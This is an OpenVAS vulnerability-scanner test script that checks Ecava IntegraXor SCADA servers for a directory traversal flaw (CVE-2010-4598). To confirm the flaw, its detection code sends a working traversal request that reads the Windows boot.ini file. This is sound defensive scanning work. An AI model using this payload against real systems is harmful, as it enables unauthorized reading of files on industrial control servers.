##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ecava_integraxor_dir_trav_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# Ecava IntegraXor Directory Traversal Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to download files from the
  disk where the server is installed through directory traversal attacks.
  Impact Level: Application.";
tag_affected = "Ecava IntegraXor version 3.6.4000.0 and prior";

tag_insight = "The flaw is due to 'open' request, which can be used by an attacker
  to download files from the disk where the server is installed.";
tag_solution = "No solution or patch is available as of 22nd December, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.ecava.com/index.htm";
tag_summary = "This host is running Ecava IntegraXor and is prone Directory
  Traversal vulnerability.";

if(description)
{
  script_id(801496);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-12-27 09:55:05 +0100 (Mon, 27 Dec 2010)");
  script_cve_id("CVE-2010-4598");
  script_bugtraq_id(45535);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Ecava IntegraXor Directory Traversal Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15802/");

  script_description(desc);
  script_summary("Check Ecava IntegraXor is vulnerable to Directory Traversal Attack");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web Servers");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

ecavaPort = "7131";
if(!get_port_state(ecavaPort)){
  exit(0);
}

foreach prj (make_list("/project", "/ecava", "/integraxor"))
{
  ## Send and receive response
  sndReq = string("GET ", prj, "/index.html", "\r\n");
  rcvRes = http_keepalive_send_recv(port:ecavaPort, data:sndReq);

  ## Confirm the application is ECAVA IntegraXor
  if("<title>ECAVA IntegraXor</title>" >< rcvRes )
  {
    ## Construct exploit string
    url = prj + "/open?file_name=..\..\..\..\..\..\..\..\..\..\..\boot.ini";
    sndReq = http_get(item:url, port:ecavaPort);
    rcvRes = http_keepalive_send_recv(port:ecavaPort, data:sndReq);

    ## check response to confirm vulnerability
    if("[boot loader]" >< rcvRes && "\WINDOWS" >< rcvRes)
    {
      security_warning(ecavaPort);
      exit(0);
    }
  }
}
